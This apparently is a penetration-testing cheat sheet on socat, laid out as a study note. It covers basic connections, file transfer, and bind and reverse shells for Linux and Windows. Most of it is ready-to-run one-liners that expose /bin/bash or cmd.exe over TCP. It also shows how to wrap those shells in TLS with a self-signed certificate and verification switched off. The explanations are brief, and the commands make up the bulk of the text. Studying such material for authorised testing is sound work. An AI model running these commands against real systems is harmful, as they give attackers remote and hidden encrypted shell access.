# Socat

## Binding and Listening

```text
socat - TCP4:10.11.1.8:80
```

* The hyphen `-` character is used to transfer data between stdio and the remote host \(allowing our keyboard interaction with the shell\).
* The protocol, options, and port number are colon-delimited.

```text
sudo socat TCP4-LISTEN:443 STDOUT
```

## File Transfer

```text
sudo socat TCP4-LISTEN:443,fork file:reverse_shell.pem
```

* the `TCP4-LISTEN` option specifies an IPv4 listener
* `fork` creates a child process once a connection is made to the listener, which allows multiple connections
* `file`: specifies the name of a file to be transferred:

```text
socat TCP4:10.11.0.4:443 file:reverse_shell.pem,create
```

* `file`: specifies the local file name to save
* `create` specifies that a new file will be created

## Bind Shell

{% code title="Linux Bind Shell" %}
```text
sudo socat -d -d TCP4-LISTEN:443 EXEC:/bin/bash
```
{% endcode %}

{% code title="Windows Bind Shell" %}
```text
socat TCP4-LISTEN:443 EXEC:'cmd.exe',pipes
```
{% endcode %}

```text
socat - TCP4:192.168.119.189:443
```

## Reverse Shell

```text
socat -d -d TCP4-LISTEN:443 STDOUT
```

* `-d -d` option to increase verbosity \(showing fatal, error, warning, and notice messages\)
* `STDOUT` to connect standard output \(STDOUT\) to the TCP socket

{% code title="Windows Reverse Shell" %}
```text
socat TCP4:192.168.119.189:443 EXEC:'cmd.exe',pipes
```
{% endcode %}

{% code title="Linux Reverse Shell" %}
```text
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```
{% endcode %}

* `EXEC` option \(similar to the Netcat -e option\), which will execute the given program once a remote connection is established

## Encrypted Shells

Firstly, create a self-signed certificate using `openssl`

{% page-ref page="../linux-things/linux-useful-utilities.md" %}

```text
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

### Encrypted Bind Shell

{% code title="Encrypted Linux Bind Shell" %}
```text
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```
{% endcode %}

{% code title="Encrypted Windows Bind Shell" %}
```text
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:'cmd.exe',pipes
```
{% endcode %}

* `OPENSSL-LISTEN` option to create the listener on port 443 with `OPENSSL`
* `cert=bind_shell.pem` to specify our certificate file
* `verify=0` to disable SSL verification
* `fork` to spawn a child process once a connection is made to the listener:

```text
socat - OPENSSL:10.11.0.4:443,verify=0
```

* `-` to transfer data between STDIO and the remote host
* `OPENSSL` to establish a remote SSL connection to  listener on 10.11.0.4:443
* `verify=0` to disable SSL certificate verification

### Encrypted Reverse Shell

```text
socat -d -d OPENSSL-LISTEN:443,cert=reverse_shell.pem,verify=0 STDOUT
```

{% code title="Encrypted Windows Reverse Shell" %}
```text
socat OPENSSL:192.168.119.189:443,verify=0 EXEC:'cmd.exe',pipes
```
{% endcode %}

{% code title="Encrypted Linux Reverse Shell" %}
```text
socat OPENSSL:192.168.189.10:443,verify=0,fork EXEC:/bin/bash
```
{% endcode %}



